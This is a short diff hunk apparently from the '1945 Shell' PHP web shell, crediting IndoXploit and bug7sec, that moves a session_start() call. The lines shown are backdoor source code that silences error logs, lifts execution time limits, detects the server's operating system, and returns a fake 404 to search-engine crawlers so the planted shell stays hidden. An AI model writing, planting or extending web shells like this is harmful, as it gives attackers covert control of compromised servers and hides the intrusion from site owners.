@@ -15,7 +15,7 @@
 @ JavaCodeRulez [JavCode] - IndoXploit - bug7sec
 -----------------------------------------------
 **/
-session_start();error_log(0);ob_start();error_reporting(0);set_time_limit(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors', 0);if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit","ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");if(preg_match('/'.implode('|', $userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}if(strtolower(substr(PHP_OS,0,3)) == "win"){$os = 'win';}else{$os = 'nix';}if(function_exists('set_magic_quotes_runtime')){set_magic_quotes_runtime(0);}
+error_log(0);ob_start();error_reporting(0);set_time_limit(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors', 0);if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit","ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");if(preg_match('/'.implode('|', $userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}if(strtolower(substr(PHP_OS,0,3)) == "win"){$os = 'win';}else{$os = 'nix';}if(function_exists('set_magic_quotes_runtime')){set_magic_quotes_runtime(0);}session_start();
 //-------------------------------- 1945 Shell - 1945v2017 ---------------------------------
 //1945 shell configuration
 $color_1945   = "#fff"; 
